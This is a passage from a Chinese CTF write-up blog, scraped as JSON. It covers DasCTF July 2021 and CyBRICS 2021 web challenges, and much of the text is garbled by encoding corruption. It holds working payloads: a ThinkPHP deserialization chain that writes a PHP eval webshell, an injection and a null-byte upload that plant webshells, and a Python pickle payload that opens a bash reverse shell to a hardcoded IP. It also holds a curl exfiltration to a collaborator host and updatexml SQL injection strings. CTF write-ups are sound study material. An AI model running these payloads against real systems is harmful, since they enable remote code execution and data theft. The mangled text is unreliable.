$HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } ä¸Šä¼ \n/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D è™½ç„¶ä¼šè¿”å›ä¸€ä¸ªæŠ¥é”™çš„é¡µé¢ï¼Œä½†æ˜¯å¯ä»¥åœ¨/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.phpå¤„éªŒè¯ä¸€ä¸‹æ˜¯å¦å†™ä¸Šäº†ğŸï¼Œæ–‡ä»¶åå­—æ˜¯md5('tag_'.md5($this-\u0026gt;tag))ï¼Œè¿æ¥å¯†ç æ˜¯ccc ç›´æ¥èšå‰‘\nåœ¨é›ªæ®‡çš„wpä¸­ç”¨çš„æ˜¯å¦ä¸€ä¸ªï¼Œæ›´ç›´æ¥çš„å†™ğŸæ–¹å¼ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯ï¼ˆå¤§æ¦‚\næˆ‘ä»¬å¯ä»¥å…ˆå°è¯•çœ‹çœ‹æ•æ„Ÿå‡½æ•°file_put_contents()æ˜¯å¦èƒ½åˆ©ç”¨\nåœ¨application/admin/controller/Upgrade.phpä¸‹çœ‹åˆ°äº†æ–‡ä»¶å†™å…¥çš„å‡½æ•°ï¼Œå®ƒä½äºåœ¨writelog()ä¸­ï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯å¤„ç†postè¯·æ±‚ä¼ å…¥çš„å„é¡¹å‚æ•°\nè¿™ä¸ªconfig('client_upgrade_edition')æï¼Œè·Ÿäº†ä¸€ä¸‹ å®ƒä¼šè¿”å›nullï¼Œå†å¾€ä¸Šçœ‹åˆ°_initialize()\næ‰€ä»¥æœ€åæ˜¯ä¼šå°†$upgrade_editionå†™å…¥ä¸­/runtime/client_upgrade_edtion.phpä¸­ï¼›è€Œæ•´ä¸ªwritelog()å‡½æ•°ä¼šè¢«sysup()è°ƒç”¨\nè·Ÿè¿›è¿™ä¸ªsysup()å’Œ$upgrade_edtionï¼Œçœ‹æ˜¯å¦å¯ç”¨+å¦‚ä½•ç”¨\nåœ¨template/admin_style/default/admin/upgrade/index.htmä¸‹çœ‹åˆ°äº†ç¡®å®å­˜åœ¨çš„è·¯ç”±ï¼Œè¿™ä¸ªçš„é¡µé¢æ˜¯åœ¨åå°ç®¡ç†ä¸­å¿ƒ - ç³»ç»ŸåŠŸèƒ½ - ç³»ç»Ÿåœ¨çº¿å‡çº§å¤„ï¼Œéšä¾¿å‡ä¸€ä¸ªçœ‹çœ‹\næŠ“åŒ…ä¹‹åçœ‹åˆ°è¿™é‡Œç¡®å®æœ‰postè®¿é—®å’Œupgrade_edtionå‚æ•°ï¼Œé‚£å°±ç¨³äº†ï¼Œç›´æ¥å†™ğŸ\n/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E// å°†ğŸå†™è¿›çš„ç›®æ ‡é¡µé¢/runtime/client_upgrade_edition.phpè¿å…¥èšå‰‘ æ‹¿flagå³å¯\nâ€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™æˆ‘å…¶å®æ˜¯æ²¡æœ‰æœåˆ°é½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡è¿™ç¯‡çš„ï¼Œå½“æ—¶æ€è·¯æ˜¯åœ¨åå°åœ¨æ‰¾æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ç›´æ¥å†™ğŸ ï¼Œå½“æ—¶æ‰¾çš„æ˜¯ç‹¬ç«‹é¡µç®¡ç†ï¼Œå°è¯•uploadï¼Œä½†æ˜¯å¹¶ä¸å¤ªè¡Œï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ï¼Œç„¶åä¹Ÿæ²¡å»å®¡ä»£ç ï¼ˆæ‡’ç‹—ï¼‰æ‰€ä»¥ å°±æ²¡å‡ºè¿™ä¸ªé¢˜ï¼Œç°åœ¨çœ‹è¿˜æ˜¯ç–å¿½äº† ç¡®å®å®Œå…¨æ²¡æ³¨æ„åˆ°ç³»ç»Ÿåœ¨çº¿å‡çº§è¿™ä¸ªæ¨¡å—æ˜¯å¯ç”¨çš„ ä¹Ÿæ²¡æœ‰è®¤çœŸçš„åˆ†ææºç  æˆ‘çš„è¿‡\nå®‰å…¨,å®‰å…¨,è¿˜æ˜¯xxxçš„å®‰å…¨  æŸä¸ªç‰¹åˆ«å®‰å…¨çš„å•†åº—\nHint:\nCREATE TABLE \u0026#34;users\u0026#34; ( \u0026#34;id\u0026#34; INTEGER NOT NULL, \u0026#34;username\u0026#34; TEXT UNIQUE , \u0026#34;login_password\u0026#34; text, \u0026#34;money\u0026#34; INTEGER, \u0026#34;pay_password\u0026#34; TEXT, \u0026#34;flag_num\u0026#34; INTEGER, PRIMARY KEY (\u0026#34;id\u0026#34;) ); CREATE TABLE \u0026#34;flaaaaaaaaag\u0026#34; ( \u0026#34;flllllllag\u0026#34; TEXT );  ç‰¹åˆ«ç®€é™‹çš„å‰ç«¯ï¼Œæœ‰ç™»å½•å’Œæ³¨å†Œå’Œä¸»é¡µä¸‰ä¸ªé¡µé¢ï¼Œç™»å½•å¤„æœ‰ä¸€å®šè¿‡æ»¤ å­˜åœ¨sqliä»»æ„æ³¨å†Œè´¦å·ï¼Œèµ°ä¸€æ³¢æµç¨‹\nğŸ˜…èšŒåŸ ä½äº†\nå›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹Burpå¯¹åˆšæ‰æ“ä½œçš„æŠ“åŒ…ç»“æœï¼Œä»cookieå¯ä»¥çŸ¥é“åç«¯æ˜¯flaskæ¡†æ¶ ï¼Œflaskçš„è¯ä¸€èˆ¬æ ‡é…sqliteæ•°æ®åº“ï¼Œç„¶åçœ‹ä¸‹é¡µé¢æºç \næ³¨å†Œæ—¶ç”¨postæäº¤ä¿¡æ¯ï¼Œå¯†ç éƒ¨åˆ†ç”¨çš„æ˜¯md5(app.users.password+'CBCTF')ï¼Œæ”¯ä»˜å¯†ç æ˜¯encrsa(app.users.pay_password)ï¼Œå¥½å®¶ä¼™ è¿™ä¸ªåŠ å¯† pay_passwordéƒ¨åˆ†md5+rsa+b64\u0026hellip;\u0026hellip;\nâ€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™åŸºæœ¬å°±åœåˆ°è¿™é‡Œäº†ï¼Œæ„Ÿè§‰æ˜¯sqli ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ³¨ å…¨æ˜¯md5çš„ï¼Œä»¥ä¸‹æ˜¯å‚è€ƒwpä¹‹åçš„å¤ç°\nèµ›åè®²é¢˜çš„æ—¶å€™ å‡ºé¢˜å¸ˆå‚…è¯´å‚è€ƒçš„æ˜¯è¿™ä¸€ç¯‡æ–‡ç« æ•°æ®åŠ å¯†æˆ–æˆWAFå¤±æ•ˆæœ€å¤§å…ƒå‡¶â€¦ï¼ˆåŸå¸–è¢«404äº† åªæœ‰ä¸ªå¿«ç…§ è¿˜æ˜¯ç™¾åº¦å¿«ç…§æ‰èƒ½çœ‹ è€Œä¸”æ²¡å›¾ï¼‰æ ¸å¿ƒæ˜¯è¿™ä¸€æ®µ\nè¿™ä¸ªé¢˜çš„flagè´­ä¹°å°ç«™ï¼Œå¯¹pay_passwordæ˜¯è¿›è¡Œå‰ç«¯md5+rsa+b64åŠ å¯†ï¼Œåç«¯å†å¯¹åº”ç€æ‹¿ç§é’¥è§£å¯†ï¼Œå­˜å…¥æ•°æ®åº“çš„æ˜¯md5å€¼ï¼Œçœ‹ä¼¼å¾ˆå®Œç¾ ä½†æ˜¯å…¶å®æ ¹æœ¬æ²¡æœ‰wafçš„ä»‹å…¥ æ²¡æœ‰å¯¹å‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå¦‚æœæˆ‘ä»¬ä»ä¸­é—´ä»‹å…¥ åªä¿ç•™rsa+b64çš„éƒ¨åˆ† å°±å¯ä»¥ä»»æ„æ§åˆ¶å‚æ•°è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„æ•ˆæœ\nå…¬é’¥åœ¨ç½‘é¡µæºç ä¸­å·²ç»ç»™å‡ºï¼Œæ•°æ®è¡¨çš„ç»“æœä¹Ÿå·²ç»åœ¨Hintä¸­äº†ï¼Œç”¨cyberchefä¸€æŠŠæ¢­\né‡æ–°æ³¨å†Œä¸ªè´¦å·ï¼Œåªä¿®æ”¹ä¸€ä¸‹usernameå³å¯ passwdä¸ç”¨å˜ å°†pay_passwordä¿®æ”¹ä¸ºä¸Šé¢ç”Ÿæˆçš„å€¼ï¼Œç™»é™†åå³å¯çœ‹åˆ°flag\njj\u0026rsquo;s camera  jjåœ¨æŸæ¬¡ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¸­å‘ç°äº†ä¸ªé»‘å®¢åšçš„ç½‘ç«™ï¼Œè¯·ä½¿ç”¨httpsè®¿é—®ç«™ç‚¹\nHint: ç½‘ä¸Šèƒ½æœåˆ°æºç ï¼Œä»…ä¿®æ”¹äº†å‰ç«¯uiï¼Œæ³¨æ„æœåŠ¡å™¨çš„å“åº”\n ä¹Ÿæ˜¯å·²æœ‰çš„ä¸œè¥¿ ä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡æœåˆ°æºç ï¼ˆå°´å°¬ï¼‰æºç åœ¨è¿™é‡Œï¼šåœ¨å—å®è´ï¼Ÿä½ ç‚¹å¼€è¿™ä¸ªç½‘å€çœ‹çœ‹[æ‰“å¼€ç½‘ç«™å·æ‹ç…§ç‰‡] | ç‚¹å¼€ä¸€ä¸ªç½‘å€æˆ‘è¢«è®°å½•äº†ipè¿˜å·æ‹äº†ç…§ç‰‡\nï¼ˆæˆ‘è¿™ä¸ªæ™ºå•†çœŸçš„æ˜¯è´Ÿæ•°èµ·æ­¥çš„ ä¸Šé¢è¿™ä¸¤ä¸ªå¸–å­æˆ‘çœ‹äº†å¥½ä¹… æ‰ååº”è¿‡æ¥è¿™ä¸ªé’“é±¼ç½‘ç«™æ˜¯è¦å¹²å•¥ã€‚ã€‚ã€‚ã€‚\nå‰ç«¯æ˜¯ä¸€ä¸ªé“¾æ¥ç”Ÿæˆç«™ ä¸­é—´å¯ä»¥åŠ ä¸€ä¸ªidçš„å‚æ•°ï¼Œè®¿é—®åä¼šè‡ªåŠ¨è°ƒç”¨æ‘„åƒå¤´ï¼ˆä½†æ˜¯ä¼šæœ‰ä¸ªæç¤ºçš„å¼¹çª—ï¼‰ï¼Œå…ˆæ‹ç…§å†ç›¸åº”é“¾æ¥ï¼Œä¹‹åå¯ä»¥åˆ°å…ˆå‰çš„é¡µé¢æŸ¥çœ‹æ‹åˆ°çš„ç…§ç‰‡ï¼Œæ•°æ®ä»¥postçš„å½¢å¼ä¸Šä¼ è‡³/qbl.php?id=xxx\u0026amp;url=xxxï¼Œè¿™æ˜¯qbl.phpçš„æºç \n\u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//å­˜æ”¾åœ¨å½“å‰ç›®å½•çš„imgæ–‡ä»¶å¤¹ä¸‹ if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt;file_put_contents()æ‰§è¡Œæ–‡ä»¶å†™å…¥ï¼Œå†…å®¹å¯æ§+è·¯å¾„å·²çŸ¥ï¼Œè¿‡æ»¤çš„ç‚¹åœ¨äºåç¼€åæ˜¯bmpæˆ–png å¹¶ä¸”åªæœ‰é™¤å»åç¼€çš„è¿™æ–‡ä»¶åå¯æ§ï¼Œphpç‰ˆæœ¬æ˜¯5.2.17ï¼Œç”¨00æˆªæ–­ç»•è¿‡ï¼ˆpostéƒ¨åˆ†è¦urlencodeä¸€ä¸‹ burpæˆ–è€…hackbarå°±ç›´æ¥è½¬äº†\n/qbl.php?id=wuhu.php%00a\u0026amp;url=http://baidu.com POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg== å‚è€ƒï¼šwp\neasyweb æœ‰ä¸€ä¸ªdockerçš„é™„ä»¶å’Œä¸€äº›æºç \né¦–é¡µå°±æ˜¯ä¸ªç™½åº•é»‘å­—çš„Hello Worldï¼Œå®¡ä¸‹æºç \nç›´æ¥æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼ˆå› ä¸ºè¿™é‡Œæ¶‰åŠåˆ°sessionçš„è°ƒç”¨ æ‰€ä»¥åœ¨.vscodeä¸­çš„launch.jsonå¤„æ·»åŠ ä¸€ä¸ªconfiguration: \u0026quot;justMyCode\u0026quot;: falseè¿™æ ·å¯ä»¥åœ¨è°ƒç”¨å †æ ˆå¤„çœ‹åˆ°å®Œæ•´çš„è°ƒç”¨æƒ…å†µ\nå¯ä»¥æ³¨æ„åˆ°æ¯æ¬¡åˆ·æ–°ä¹‹å sessionçš„å€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ç”Ÿæˆè¿™ä¸ªsessionæ—¶è°ƒç”¨äº†dumpsæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜å°±æ˜¯ååºåˆ—åŒ–çš„å¥—è·¯å•¦\npayloadæœ‰ä¸¤ç§å§ åå¼¹shell æˆ–è€…æ„é€ post/getè¯·æ±‚åˆ°è‡ªå·±å¯ä»¥æ¥æ”¶åˆ°çš„å¹³å°ä¸Šï¼Œä¹Ÿéƒ½æ˜¯å¸¸è§„åšæ³•\nclass A: def __reduce__(self): cmd = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/175.24.73.30/2333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; s=\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;{}\u0026#39;).read()\u0026#34;.format(cmd) return (eval,(s,)) #reduceå¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸² def hello_world(request): request.session[\u0026#34;233\u0026#34;] = \u0026#34;2333\u0026#34; request.session[\u0026#34;a\u0026#34;] = A() return Response(\u0026#39;Hello World!\u0026#39;) æ„é€ è¯·æ±‚çš„è¯è¿˜æ˜¯è€æœ‹å‹~~ burp collaborator~~\ncurl \u0026#34;xxxxxx.burpcollaborator.net/`readflag`\u0026#34; å‚è€ƒï¼šwp\neasyjava java æ ¹æœ¬ä¸ä¼š\næ”¾ä¸ªå‚è€ƒé“¾æ¥ æºœäº†ï¼šwp1 wp2\n æœ€è¿‘åœ¨æ€»ç»“ååºåˆ—åŒ–æœ‰å…³çš„ä¸œè¥¿ï¼Œæƒ³æŠŠphp, python, javaçš„ååºåˆ—åŒ– åšè¿‡çš„ä¸œè¥¿æ€»ç»“æ€»ç»“ï¼Œä½†è¿˜æ˜¯æˆ‘æƒ³å¾—å¤ªç®€å•äº† ä¸€ä¸ªphpçš„ååºåˆ—åŒ–å°±æœ‰å¥½å¤šå¥½å¤šä¸œè¥¿ï¼ˆè£…æ­»ï¼‰\näº‰å–æ—©æ”¶å·¥å§ï¼Œè¿˜æœ‰upload, xss, csrf, sqli\u0026hellip;\u0026hellip;ç­‰ç€æ€»ç»“ è¿˜æœ‰è¶…çº§å¤šä¸œè¥¿è¦å­¦è¦çœ‹\nå­¦ä¹ å¥½è€¶ï¼Ïƒ`âˆ€Â´)\n","date":"2021-08-05T23:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/","section":"posts","tags":["wp"],"title":"DasCTF0721 Wp"},{"categories":["CTF"],"contents":"Mic Check (Cyber, Baby, 50 pts)  Author: Vlad Roskov (@mrvos)\nThose organizers are changing game rules all the time! Thereâ€™s a flag there, and itâ€™s not that easy to capture.\nAlso be sure to join @cybrics Telegram chat for challenge-related announcements and contacting orgs in case all goes wrong\nAdded at 10:10 â€” looks like the little mic check trolling caused massive pain, Iâ€™ve untrolled the rules page :-) You can now copy-paste freely\n Scanner (rebyC, Baby, 50 pts)  Author: Mikhail Driagunov (@aethereternity)\nCheck out this cool new game!\nI heard they serve flags at level 5.\n ä¸éš¾ï¼Œå°±æ˜¯æ¯”è¾ƒé¸¡è´¼ æŠŠå¥½å¥½çš„å›¾ç‰‡å¼„æˆçŠ¹æŠ±çµç¶åŠé®é¢\né¦–å…ˆç”¨Gif SuperæŠŠå¸§é—´éš”è°ƒä¸º300msï¼Œç„¶åè£å‰ªå‡ºä¸­é—´æœ‰ç”¨çš„éƒ¨åˆ† æ”¾å…¥GIFåŠ¨æ€å›¾ç‰‡åˆ†è§£ä¸­çœ‹ç»“æœ éƒ½æœ‰åœ¨çº¿å·¥å…·å°±å¾ˆæ–¹ä¾¿\næ‰€ä»¥è¿™ä¸ªç ´ç©æ„åˆ°åº•æ˜¯å•¥ï¼ŸçŒªï¼Ÿè¿˜æ˜¯åˆºçŒ¬ï¼Ÿ åˆ«çš„éƒ½è¿˜ç®—æ­£å¸¸å§ å°±æ˜¯éƒ½ä¸å¤ªåƒå…¶å® æœ‰star, goose, flag, flower, ring, house, bone\u0026hellip;. æœ€åä¸€ä¸ªæ˜¯äºŒç»´ç  æ¯”è¾ƒéº»çƒ¦\nå†ç¨å¾®è°ƒæ•´ä¸€ä¸‹å°ºå¯¸ï¼Œæ‰«æå°±è¡Œäº†rm -rfâ€™er (CTB, Baby, 166 pts)  Author: Vlad Roskov (@mrvos)\nAlarm! We accidentally did rm -rf /* on a very important server. Now all thatâ€™s left is one shell session.\nssh rmrfer@178.154.210.26 Password: sa7Neiyi Rescue the flag.txt file from one of the directories by only using your shell\nAdded at 13:45 â€” frequent question: yes, if you found flag.txt, the flag is right there, in the open, as plain text. Just read it. If youâ€™re not seeing the flag, try to find another method that will not hide info from you\n è¿™ä¸ªé¢˜ emmmmm åªè¦sshä¸€è¿æ¥å°±ä¼šè‡ªåŠ¨æ‰§è¡Œrm -rf /*çš„æŒ‡ä»¤ï¼Œå½“ååº”è¿‡æ¥çš„æ—¶å€™ç³»ç»Ÿå·²ç»åˆ çš„è¿lsæŒ‡ä»¤éƒ½ä¸å‰©äº†\nå…ˆè¯´éé¢„æœŸè§£å§ï¼šå½“è¾“å…¥è¿æ¥å¯†ç åç«‹åˆ»ctrl+c åªè¦å¤Ÿå¿« å°±æ‰§è¡Œä¸äº†rm -rf /*ï¼Œä¹‹åå°±å¯ä»¥é¡ºç•…çš„ç©¿æ¢­äºè¿™ä¸ªbuildboxä¹‹é—´æ‹¿flagäº†\né¢„æœŸè§£åˆ™æ˜¯è¿™æ ·çš„ï¼šå½“ç³»ç»Ÿæ‰§è¡Œåˆ é™¤å‘½ä»¤å å¾ˆå¤šå¤–éƒ¨æŒ‡ä»¤éƒ½è¢«åˆ é™¤ éœ€è¦é€šè¿‡ä»…å‰©çš„ä¸€äº›å†…ç½®å‡½æ•°å®Œæˆ\u0026quot;read\u0026quot;çš„åŠŸèƒ½ï¼›ä»ä¹‹å‰çš„æŠ¥é”™ä¿¡æ¯å¯çŸ¥ buildboxä½¿ç”¨çš„æ˜¯tcshï¼Œåœ¨tcshä¸­echo $\u0026lt;å‘½ä»¤ç›¸å½“äºreadå‡½æ•°ï¼Œè¯»å…¥æ ‡å‡†è¾“å…¥å¹¶è¾“å‡ºï¼›tcshä¸­åŠ æ‹¬å·çš„å‘½ä»¤éƒ½ä¼šåœ¨å­shellä¸­è¿è¡Œï¼›æ„é€ payload (echo \u0026quot;$\u0026lt;\u0026quot;) \u0026lt; /etc/ctf/flag.txtï¼Œå³ è¯»å–flag.txtå¹¶è¾“å‡º\nAd Network (Web, Baby, 50 pts)  Author: Alexander Menshchikov (@n0str)\nWe are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.\nAdnetwork website\nThere is a flag 1337 redirects deep into the network\u0026hellip;\n è¿™ä¸ªæˆ‘æ˜¯ä¸çŸ¥é“æ€ä¹ˆåšâ€¦â€¦é¡µé¢ä¸Šçš„ä»»ä½•é“¾æ¥éƒ¨åˆ†éƒ½æ˜¯è‡ªå·±é¡µé¢å†…çš„è·³è½¬ï¼Œæç¤ºçš„æ˜¯redirecté‡å®šå‘ï¼Œå¯æ˜¯æŠ“åŒ…åæ²¡æœ‰302 ä¹Ÿæ²¡æœ‰ä¸€ç›´åœ¨åšé‡å®šå‘å‘€ è¦æ€ä¹ˆçœ‹å‘¢ï¼Ÿ\nemmmm åœ¨æ¯”èµ›ç¬¬äºŒå¤©å†æ¬¡å°è¯•çš„æ—¶å€™ç”¨burpçš„è‡ªå¸¦çš„chromiumçš„æµè§ˆå™¨ï¼ˆä¹‹å‰æ˜¯çŸ¥é“è¿™ä¸ª ä½†æ˜¯æ²¡æœ‰ç”¨è¿‡ï¼‰æ¬¸ é¡µé¢å·¦ä¸Šè§’æ˜¾ç¤ºäº†ä¸€ä¸ªgifå›¾ è¿™ä¸ªå›¾åœ¨æ˜¨å¤©åšçš„æ—¶å€™çœ‹åˆ°ï¼Œ å†…å®¹æ˜¯ awesome ad from adnetworkï¼Œä½†æ˜¯edgeæµè§ˆå™¨åœ¨åŠ è½½è¿™ä¸ªå›¾çš„æ—¶å€™ä¼šè‡ªåŠ¨é˜»æ­¢ æˆ‘å•ç‹¬çœ‹äº†å†…å®¹ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆç‰¹åˆ«çš„ å°±æ²¡æœ‰æ³¨æ„è¿™é‡Œã€‚äº‹åè§’åº¦çœ‹è¿™é‡Œ å…¶å®ä¸€ä¸ªGifå›¾è¢«é˜»æ­¢è¯·æ±‚åº”è¯¥æ˜¯å¾ˆåå¸¸çš„äº‹æƒ…ï¼Œåº”è¯¥é¦–å…ˆå¼•èµ·æ³¨æ„çš„\u0026hellip;\u0026hellip; ï¼ˆéƒ½æ€ªedge!!!\nç‚¹å‡»gifä¼šæœ‰å•ç‹¬çš„å¼¹çª—å‡ºæ¥ï¼Œæç¤ºé‡å®šå‘æ¬¡æ•°è¿‡å¤šï¼›çœ‹burpä¸­çš„æŠ“åŒ…è®°å½• ç¡®å®å¤šçš„ç¦»è°±ï¼ŒæŒ‰ç…§é¢˜ç›®ä¸­çš„æç¤º å¾—æœ‰1337å±‚ï¼Œå¾—ä¸Šä¸ªè„šæœ¬æ…¢æ…¢è·‘äº† è¿™ä¸ªæ¯”è¾ƒå¥½å¼„\nimport requests url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; for _ in range(1337): r = requests.get(url, allow_redirects=False) url = r.text[9:-18] print(url) emmm æ¯”è¾ƒæ…¢å…¶å® åº”è¯¥æœ‰åˆ«çš„çš„æ–¹å¼ï¼Ÿæœ€åçš„flagæ˜¯ cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}\næ¯”èµ›å®Œäº†çœ‹äº†åˆ«çš„wp è¿™å—å¯ä»¥ç”¨sessionè®¾å…è®¸é‡å®šå‘çš„æ¬¡æ•°ï¼Œè¿™æ ·æ›´æ–¹ä¾¿\nimport requests session = requests.Session() session.max_redirects = 1337 url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; r = session.get(url, allow_redirects=True) print(r.text) print(r.url) Announcement (Web, Easy, 60 pts)  Author: Alexander Menshchikov (@n0str)\nLadies and gentlemen!\nAllow us to introduce a brand new project â€” âš The Flag\nAnnouncement website\n ç®€çº¦æ¼‚äº®çš„å‰ç«¯\næœ‰ä¸ªè¾“å…¥é‚®ç®±çš„æ¡†ï¼Œæäº¤ä¼šå‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼šdigest=xxxx\u0026amp;email=xxxx å°è¯•ä¸€ä¸ª1@1.comï¼Œé‡æ”¾çš„æ—¶å€™ç›´æ¥ä¿®æ”¹emailå€¼ä¼šæç¤ºInvalid digestï¼Œå‘ç°å…¶ä¸­digestçš„å€¼å°±æ˜¯md5(\u0026lsquo;1@1.com\u0026rsquo;) éšemailè€Œæ”¹å˜ï¼Œå°è¯•æ³¨å…¥\ndigest=76af11f3eaf7b12e72d7d88e4cf2ee01\u0026amp;email='or'1\t// å›æ˜¾æ­£å¸¸ æ— æŠ¥é”™ digest=c3593d255957d60d5d489ae682da8aee\u0026amp;email=1')#\t// æŠ¥é”™ï¼šSomething went wrong during database insert: Column count doesn't match value count at row 1 digest=5c07c683d062d17ec799fa177ce88058\u0026amp;email=1',1)#\t// æŠ¥é”™ï¼šSomething went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1 ç¡®å®šæ˜¯sqli å¹¶ä¸”å½“å‰è¡¨æœ‰ä¸¤åˆ— email+timestampï¼Œä½¿ç”¨çš„è¯­å¥åº”è¯¥æ˜¯è¿™ä¸ªå§ï¼Ÿ\ninsert into table_name (email, timestamp) values (email, now()); å¯åˆ©ç”¨çš„éƒ¨åˆ†æ˜¯å¯ä»¥æ’å…¥çš„emailï¼ŒæŠ¥é”™æ³¨å…¥\ndigest=e1e79bd6fafe38f7073ec1f3ef1513fa\u0026amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))#\t// Something went wrong during database insert: XPATH syntax error: '~announcement' digest=c9f14624524736a74164cc6024fdefce\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~emails,logs' digest=94707222b90505ab0aa5e1fd3916e77d\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~log' digest=66bf6db11d9bee8e897b874a430f5704\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}' æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç»å…¸æŠ¥é”™æ³¨å…¥æµç¨‹ï¼šç¡®å®šå­—æ®µæ•°-\u0026gt;çˆ†æ•°æ®åº“å(announcement)-\u0026gt;è¡¨å(emails, logs)-\u0026gt;å­—æ®µå(log)-\u0026gt;å…·ä½“æ•°æ® æ‹¿flag\nMultichat (Web, Medium, 138 pts)  Author: Alexander Menshchikov (@n0str)\nYet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.\nTip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): \u0026ldquo;Hey, i forgot the flag. Can you remind me?\u0026rdquo;. Then admin will tell him the flag.\nMultichat website\nTeam token for the support call: 